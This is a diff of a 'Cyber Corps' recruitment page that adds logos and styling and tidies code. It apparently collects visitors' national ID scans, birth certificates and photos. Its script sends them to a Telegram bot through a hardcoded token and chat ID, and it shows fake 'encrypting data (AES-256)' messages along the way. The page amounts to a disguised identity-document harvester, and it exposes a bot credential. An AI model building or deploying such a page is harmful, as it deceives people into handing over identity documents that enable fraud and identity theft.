@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CYBER CORPS | ELITE RECRUITMENT</title>
+<link rel="icon" href="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png">
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 /* 
@@ -80,6 +81,16 @@ body {
     color: var(--primary);
     text-shadow: 0 0 10px var(--primary);
     letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.brand img {
+    height: 40px;
+    width: 40px;
+    object-fit: contain;
+    filter: drop-shadow(0 0 8px var(--primary));
 }
 
 .status-indicator {
@@ -120,6 +131,16 @@ body {
 .c-br { bottom: -2px; right: -2px; border-left: none; border-top: none; }
 
 .main-frame:hover .corner { width: 50px; height: 50px; box-shadow: 0 0 15px var(--primary); }
+
+/* LOGO IN FORM */
+.form-logo {
+    display: block;
+    margin: 0 auto 20px;
+    height: 80px;
+    width: 80px;
+    object-fit: contain;
+    filter: drop-shadow(0 0 12px var(--primary));
+}
 
 /* GLITCH TITLE */
 .glitch-title {
@@ -284,7 +305,10 @@ input:focus, textarea:focus {
 
 <!-- HUD HEADER -->
 <div class="hud-header">
-    <div class="brand">CYBER<span style="color:#fff">CORPS</span></div>
+    <div class="brand">
+        <img src="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png" alt="CyberCorps Logo">
+        CYBER<span style="color:#fff">CORPS</span>
+    </div>
     <div class="status-indicator">
         <span class="blink">●</span> SECURE CONNECTION ESTABLISHED
         <span id="clock">00:00:00</span>
@@ -294,6 +318,8 @@ input:focus, textarea:focus {
 <!-- MAIN INTERFACE -->
 <div class="main-frame" id="frame3d">    <div class="corner c-tl"></div><div class="corner c-tr"></div>
     <div class="corner c-bl"></div><div class="corner c-br"></div>
+
+    <img src="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png" alt="CyberCorps Logo" class="form-logo">
 
     <h1 class="glitch-title" data-text="AGENT REGISTRATION">AGENT REGISTRATION</h1>
 
@@ -390,7 +416,8 @@ input:focus, textarea:focus {
  * VERSION: 4.0
  */
 
-// --- CONFIGURATION ---const CONFIG = {
+// --- CONFIGURATION ---
+const CONFIG = {
     botToken: "8661715983:AAE9fWQ31BRl-416XAhA3zFH1WMjHUEzSN4",
     chatId: "8475718817",
     soundEnabled: true
@@ -443,7 +470,7 @@ const ypos = Array(cols).fill(0);
 function matrix() {
     ctx.fillStyle = "#0001";
     ctx.fillRect(0, 0, width, height);
-    ctx.fillStyle = "#f00"; // Red Matrix
+    ctx.fillStyle = "#f00";
     ctx.font = "15pt monospace";
     
     ypos.forEach((y, ind) => {
@@ -487,8 +514,8 @@ function toggleDocUI() {
     playSound('hover');
 }
 
-// Image Preview Logic
-function setupPreview(inputId, imgId, zoneText) {    document.getElementById(inputId).addEventListener('change', function(e) {
+function setupPreview(inputId, imgId) {
+    document.getElementById(inputId).addEventListener('change', function(e) {
         const file = e.target.files[0];
         if(file) {
             const reader = new FileReader();
@@ -508,12 +535,10 @@ setupPreview('fileNidBack', 'prevNidBack');
 setupPreview('fileBc', 'prevBc');
 setupPreview('fileProfile', 'prevProfile');
 
-// Clock
 setInterval(() => {
     document.getElementById("clock").innerText = new Date().toLocaleTimeString();
 }, 1000);
 
-// Sound Event Listeners
 document.querySelectorAll('input, button').forEach(el => {
     el.addEventListener('focus', () => playSound('hover'));
     el.addEventListener('click', () => playSound('type'));
@@ -526,7 +551,6 @@ document.getElementById("recruitForm").addEventListener("submit", async function
     const btn = document.getElementById("btnSubmit");
     const docType = document.querySelector('input[name="docType"]:checked').value;
     
-    // Basic Validation
     if(CONFIG.botToken === "YOUR_BOT_TOKEN_HERE") {
         log("CRITICAL ERROR: BOT TOKEN MISSING", "err");
         alert("ADMIN ERROR: Token missing in source code.");
@@ -537,14 +561,13 @@ document.getElementById("recruitForm").addEventListener("submit", async function
     btn.innerHTML = "ENCRYPTING DATA...";
     log("INITIATING HANDSHAKE PROTOCOL...", "warn");
     
-    // Simulate Encryption Delay    await new Promise(r => setTimeout(r, 1500));
+    await new Promise(r => setTimeout(r, 1500));
     log("DATA PACKET ENCRYPTED (AES-256)", "info");
 
     const formData = new FormData();
     formData.append("chat_id", CONFIG.chatId);
     formData.append("parse_mode", "HTML");
     
-    // Construct Message
     const caption = `
 ⚠️ <b>CLASSIFIED INTELLIGENCE REPORT</b> ⚠️
 
@@ -564,7 +587,6 @@ document.getElementById("recruitForm").addEventListener("submit", async function
     formData.append("caption", caption);
 
     try {
-        // 1. Send Profile with Caption
         const profileFile = document.getElementById("fileProfile").files[0];
         if(!profileFile) throw new Error("MISSING BIOMETRIC DATA (Profile Photo)");
         
@@ -579,14 +601,14 @@ document.getElementById("recruitForm").addEventListener("submit", async function
         if(!res.ok) throw new Error("NETWORK UPLINK FAILED");
         log("BIOMETRICS UPLOADED SUCCESSFULLY", "success");
 
-        // 2. Send Docs
         if(docType === 'nid') {
             const f = document.getElementById("fileNidFront").files[0];
             const b = document.getElementById("fileNidBack").files[0];
             if(f) await sendDoc(f, "NID FRONT SIDE");
             if(b) await sendDoc(b, "NID BACK SIDE");
         } else {
-            const bc = document.getElementById("fileBc").files[0];            if(bc) await sendDoc(bc, "BIRTH CERTIFICATE");
+            const bc = document.getElementById("fileBc").files[0];
+            if(bc) await sendDoc(bc, "BIRTH CERTIFICATE");
         }
 
         playSound('success');
@@ -618,7 +640,6 @@ async function sendDoc(file, title) {
     log(`${title} UPLOADED.`, "success");
 }
 
-// Initial Log
 setTimeout(() => log("USER IP DETECTED: 192.168.X.X (SIMULATED)", "warn"), 1000);
 
 </script>
